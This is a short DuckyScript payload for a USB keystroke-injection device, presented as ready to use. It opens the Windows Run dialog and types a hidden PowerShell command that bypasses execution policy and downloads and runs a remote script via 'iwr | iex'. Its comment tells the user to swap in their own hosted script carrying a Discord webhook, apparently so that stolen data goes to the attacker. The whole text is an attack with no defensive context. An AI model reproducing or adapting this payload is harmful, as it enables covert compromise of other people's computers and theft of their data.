# **Here is the payload in DuckyScript format:**

REM make sure to replace: `https://raw.githubusercontent.com/..LINK_TO../main/YourHostedFile.ps1` with your own url, with the modified discord webhook url in it too.
GUI r
DELAY 500
ALTSTRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/..LINK_TO../main/YourHostedFile.ps1' | iex"
ENTER
